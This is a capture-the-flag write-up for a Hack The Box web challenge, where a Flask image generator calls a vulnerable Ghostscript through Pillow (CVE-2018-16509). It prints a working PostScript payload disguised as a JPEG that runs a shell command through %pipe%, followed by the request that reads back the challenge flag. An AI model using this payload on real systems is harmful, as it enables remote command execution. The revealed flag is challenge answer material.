# [petpet rcbee](https://app.hackthebox.com/challenges/petpet-rcbee)

## CHALLENGE DESCRIPTION

Bees are comfy 🍯
bees are great 🌟🌟🌟
this is a petpet generator 👋
let's join forces and save the bees today! 🐝

## Characteristics

- python, flask
- Pillow, ghostscript-9.23
- CVE-2018-16509

## CVE-2018-16509

dockerfile

```bash
# Install Python dependencies
RUN pip install flask Pillow

# Install Pillow component
RUN curl -L -O https://github.com/ArtifexSoftware/ghostpdl-downloads/releases/download/gs923/ghostscript-9.23-linux-x86_64.tgz \
    && tar -xzf ghostscript-9.23-linux-x86_64.tgz \
    && mv ghostscript-9.23-linux-x86_64/gs-923-linux-x86_64 /usr/local/bin/gs && rm -rf /tmp/ghost*
```

line 46 `util.py`:

```py
bee = Image.open(tmp_path).convert('RGBA')
```

exploit: upload file, poc.jpg:

```jpg
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%cat flag > /app/application/static/petpets/pwn.txt) currentdevice putdeviceprops
```

request:

```http
GET /static/petpets/pwn.txt HTTP/1.1

HTTP/1.0 200 OK

HTB{c0mfy_bzzzzz_rcb33s_v1b3s}
```
